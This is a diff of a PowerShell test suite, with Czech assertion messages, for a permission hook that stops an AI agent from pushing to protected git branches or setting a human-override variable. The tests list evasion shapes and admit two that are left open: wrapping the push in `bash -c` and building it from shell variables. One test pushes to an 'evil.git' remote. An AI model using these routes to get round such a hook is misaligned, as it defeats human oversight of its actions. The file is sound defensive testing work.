@@ -87,21 +87,22 @@ foreach ($c in @(
 
 # ---------------------------------------------------------------------------
 # The PRICE of the reversal above, pinned rather than hidden: shapes that
-# round 2 deliberately let through as "not cleanly parseable" are now denied
-# too, because the tokenizer does recognize a `push` subcommand in them. The
-# last case is the sharpest — a commit message that merely QUOTES a push
-# command. That is a real false positive; it is accepted here because it errs
-# toward denying (the agent rewords the message and moves on), while the
-# opposite error hands a protected branch to the agent. The narrowness of the
-# tightening is what keeps it bearable: it applies ONLY to a recognized `push`
-# subcommand, never to the context-free checks or to plain document text.
+# round 2 deliberately let through as "not cleanly parseable" are denied now,
+# because each of these IS a push — `git` at a command position — that this
+# file cannot read. Erring toward denying costs the agent a rewrite; erring
+# the other way hands it a protected branch.
 # ---------------------------------------------------------------------------
 foreach ($c in @(
     'git push origin "feature/ums-1-alfa"',
     'git push origin feature/ums-1-alfa 2>&1',
-    'git push origin feature/ums-1-alfa # nasazení',
-    'git commit -m "vysvetli git push origin develop"'
+    'git push origin feature/ums-1-alfa # nasazení'
 )) { Assert-Match (Test-Cmd $c) 'permissionDecision.*deny' "zamítnuto (rozpoznaný push v tvaru, kterému guard nerozumí): $c" }
+
+# ... and the LINE that keeps the price from being paid on text that is not a
+# push at all: the tightening needs `git` at a COMMAND POSITION. In a commit
+# message the inner `git` is preceded by `"vysvetli`, so it is a word in a
+# string, not an invocation, and the old fail-open answer stands.
+Assert-Eq (Test-Cmd 'git commit -m "vysvetli git push origin develop"') '' 'povoleno: `git push` uvnitř commit message není příkaz na command position'
 
 # ---------------------------------------------------------------------------
 # `--no-verify` next to `push`: the one context-free substring check, since
@@ -331,8 +332,43 @@ Assert-Eq $fullBadStdin.Err '' 'žádný stderr: nerozparsovatelný vstup nevyho
 $rEscape = Test-Cmd 'MB_HUMAN_PUSH=1 git push origin HEAD:develop'
 Assert-Match $rEscape 'permissionDecision.*deny' 'guard zamítne agentní push nesoucí lidskou výjimku'
 Assert-Match $rEscape 'MB_HUMAN_PUSH' 'zamítnutí pojmenuje proměnnou, kvůli které padlo'
-# the old name is the same violation while it is still honoured by the hook
-Assert-Match (Test-Cmd 'UMS_ALLOW_SHARED_PUSH=1 git push origin develop') 'permissionDecision.*deny' 'guard zamítne i staré jméno výjimky'
+# ... and hands over the command with the variable stripped, the same way the
+# shared-branch rejection does — a deny that only scolds leaves the agent to
+# improvise the way out
+Assert-Match $rEscape '! git push origin HEAD:develop' 'zamítnutí podává příkaz bez výjimky, ne jen výtku'
+# the old name is the same violation while it is still honoured by the hook,
+# and the message must name the one that ACTUALLY triggered it
+$rOldEscape = Test-Cmd 'UMS_ALLOW_SHARED_PUSH=1 git push origin develop'
+Assert-Match $rOldEscape 'permissionDecision.*deny' 'guard zamítne i staré jméno výjimky'
+Assert-Match $rOldEscape 'UMS_ALLOW_SHARED_PUSH' 'zamítnutí jmenuje proměnnou, která ho spustila, ne tu druhou'
+Assert-Match $rOldEscape '! git push origin develop' 'zamítnutí u starého jména podává příkaz taky'
+
+# ---------------------------------------------------------------------------
+# Fix round 1, Important 3: the containment is only as wide as the SHELL's own
+# reading of the variable. `[ "$MB_HUMAN_PUSH" = "1" ]` in the hook is
+# satisfied by every spelling below, so a regex bounded by a bare `=1` and
+# whitespace would let an agent set the escape and be waved through — the very
+# hole this deny exists to close, now that the hook's escape lifts everything.
+# ---------------------------------------------------------------------------
+foreach ($c in @(
+    'MB_HUMAN_PUSH="1" git push origin develop',
+    "MB_HUMAN_PUSH='1' git push origin develop",
+    'MB_HUMAN_PUSH=1; git push origin develop',
+    'MB_HUMAN_PUSH=1;git push origin develop',
+    'MB_HUMAN_PUSH="1"; git push origin feature/ums-1-alfa',
+    'export MB_HUMAN_PUSH=1 && git push origin feature/ums-1-alfa',
+    'UMS_ALLOW_SHARED_PUSH="1" git push origin develop'
+)) { Assert-Match (Test-Cmd $c) 'MB_HUMAN_PUSH|UMS_ALLOW_SHARED_PUSH' "výjimka rozpoznaná i v tomto zápisu: $c" }
+
+# LOAD-BEARING NEGATIVES for the widened pattern: it must still key on the
+# VALUE 1, and must not fire on a different variable that merely ends in the
+# same name.
+foreach ($c in @(
+    'MB_HUMAN_PUSH="0" git push origin feature/ums-1-alfa',
+    "MB_HUMAN_PUSH='0' git push origin feature/ums-1-alfa",
+    'MB_HUMAN_PUSH=10 git push origin feature/ums-1-alfa',
+    'NOT_MB_HUMAN_PUSH=1 git push origin feature/ums-1-alfa'
+)) { Assert-Eq (Test-Cmd $c) '' "výjimkou není: $c" }
 # ... and the target does not matter: writing the variable IS the violation,
 # so an UNPROTECTED branch (which would otherwise pass) is denied too
 Assert-Match (Test-Cmd 'MB_HUMAN_PUSH=1 git push origin feature/ums-1-alfa') 'permissionDecision.*deny' 'výjimka je porušením i u nechráněné větve'
@@ -358,9 +394,12 @@ Assert-Match (Test-Cmd 'git push' $tmp) 'permissionDecision.*deny' 'bare push na
 Assert-Eq (Test-Cmd 'git push' $tmp) '' 'bare push na tiketové větvi projde'
 Remove-Item -Recurse -Force $tmp
 
-# unresolvable current branch (detached HEAD): round 1 denied this
-# fail-closed; round 2 deliberately ALLOWS it — this layer no longer
-# guesses when uncertain, it defers to the pre-push hook.
+# unresolvable current branch (detached HEAD): the ONE fail-open path left
+# inside a recognized push. Round 1 denied it, round 2 allowed it as part of a
+# blanket fail-open posture, and task 6 replaced that posture with fail-closed
+# everywhere EXCEPT here — an unguessable branch names no protected target, and
+# denying would block legitimate work from a detached HEAD (this very session
+# pushes from one). Kept as an explicit exception, not as the general rule.
 $tmp2 = Join-Path ([IO.Path]::GetTempPath()) ("mbhook-" + [guid]::NewGuid().ToString('N').Substring(0, 8))
 New-Item -ItemType Directory -Force -Path $tmp2 | Out-Null
 & git init -q -b wip $tmp2 | Out-Null
@@ -413,16 +452,44 @@ Assert-Match $r 'permissionDecision.*deny' 'guard zamítne rozpoznaný push s v�
 $r = Test-Cmd 'git push https://example.com/evil.git HEAD:feature/x'
 Assert-Match $r 'permissionDecision.*deny' 'guard zamítne rozpoznaný push s nesrozumitelným jménem remote'
 
-# Kontrolní případ: jasně neškodný push na nechráněnou větev musí dál projít,
-# jinak by fail-closed zamítal všechno a asercie výš by nic nedokazovaly.
+# Control case: an obviously harmless push to an unprotected branch must keep
+# passing, otherwise fail-closed would be denying everything and the
+# assertions above would prove nothing.
 $r = Test-Cmd 'git push -u origin feature/x'
 Assert-Eq $r '' 'kontrola: srozumitelný push na nechráněnou větev prochází'
 
-# Zbytkový průchod přiznaný v návrhu: tvar, ve kterém se token `git` vůbec
-# nerozpozná, se fail-closed větve nikdy nedotkne. `bash -c '…'` je přesně ten
-# případ, kterým guard prohrál oponenturu, a tenhle plán ho nezavírá.
+# Residual pass-through admitted in the design: a shape whose `git` token is
+# not recognized at all never reaches the fail-closed branch. `bash -c '…'` is
+# exactly the case that defeated this guard in adversarial review, and this
+# plan does not close it.
 $r = Test-Cmd "bash -c 'git push --mirror origin'"
 Assert-Eq $r '' 'zbytkový průchod: nerozpoznaný tvar guard nezamítá'
+
+# ---------------------------------------------------------------------------
+# THE COMMAND-POSITION BOUNDARY (fix round 1, Important 1). Fail-closed asks
+# two questions before it fires, and each one is pinned from BOTH sides here.
+#
+# Question 1 — is this `git` token an invocation at all? Only at index 0,
+# after a shell control operator, or after a NAME=value env assignment.
+# ---------------------------------------------------------------------------
+Assert-Eq (Test-Cmd 'echo git push --mirror') '' 'command position: `git` po `echo` není příkaz, fail-closed nevystřelí'
+Assert-Eq (Test-Cmd "cat <<'EOF'`ngit push --force origin develop`nEOF") '' 'command position: řádek uvnitř heredocu není příkaz'
+# ... and the three shapes that DO sit at a command position still deny
+Assert-Match (Test-Cmd 'git push --mirror origin') 'permissionDecision.*deny' 'command position: index 0 je příkaz'
+Assert-Match (Test-Cmd 'cd /repo && git push --mirror origin') 'permissionDecision.*deny' 'command position: po řídicím operátoru je příkaz'
+Assert-Match (Test-Cmd 'FOO=bar git push --mirror origin') 'permissionDecision.*deny' 'command position: po přiřazení proměnné prostředí je příkaz'
+
+# ---------------------------------------------------------------------------
+# Question 2 — can the arguments be read at all? A token carrying shell
+# EXPANSION names a remote or ref that simply is not in the string, which is
+# the same state as `bash -c '…'` above, not "a literal I refuse to read".
+# QUOTING is not expansion, so the obvious evasion (quote the branch name)
+# stays closed — that pair is the whole point of this block.
+# ---------------------------------------------------------------------------
+Assert-Eq (Test-Cmd 'git push "$remote" "$branch"') '' 'expanze: skutečný push s proměnnými se nezamítá, guard cíl prostě nezná'
+Assert-Eq (Test-Cmd 'git push $remote $branch') '' 'expanze: totéž bez uvozovek'
+Assert-Match (Test-Cmd 'git push origin "develop"') 'permissionDecision.*deny' 'úniková cesta zavřená: uvozovky kolem jména větve expanze nejsou'
+Assert-Match (Test-Cmd 'git push "origin" "release/2026.1"') 'permissionDecision.*deny' 'úniková cesta zavřená: uvozovky kolem obojího expanze nejsou'
 
 # The exit-code/stderr half: a deny must be a CLEAN deny, not a crash that
 # merely happens to print JSON (or, worse, nothing).
